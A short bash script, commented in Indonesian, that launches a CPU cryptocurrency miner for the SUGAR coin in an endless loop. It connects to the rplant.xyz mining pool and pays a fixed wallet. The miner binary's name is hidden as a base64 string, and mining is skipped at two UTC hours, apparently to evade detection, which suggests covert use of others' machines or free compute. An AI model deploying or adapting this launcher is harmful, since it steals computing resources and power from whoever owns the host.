#!/bin/bash

jam2digit=$(date -u +%H)
jam1digit=$((jam2digit))
echo $jam2digit $jam1digit
ketentuan1=2
ketentuan2=14
if [[ $jam1digit -eq $ketentuan1 ]]
then
  echo "sama dengan $ketentuan "
elif [[ $jam1digit -eq $ketentuan2 ]]
then
  echo "sama dengan $ketentuan "
else
  echo "enggak $ketentuan "
  #chmod +x cpuminer-sse2
  chmod +x Y3B1bWluZXItc3NlMg
  while [ 1 ]; do
  #./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
  ./Y3B1bWluZXItc3NlMg -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
  sleep 5
  done
fi

#echo 'index'

#lscpu

#curl http://ip-api.com/json/

#chmod +x cpuminer-sse2

#
# Choose nearest stratum:
#       stratum-ru.rplant.xyz   /Moscow/
#       stratum-eu.rplant.xyz   /London/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Toronto/
#

#while [ 1 ]; do
#echo 'index'
#./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID128
#./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
#sleep 5
#echo 'index'
#done

#echo 'index'
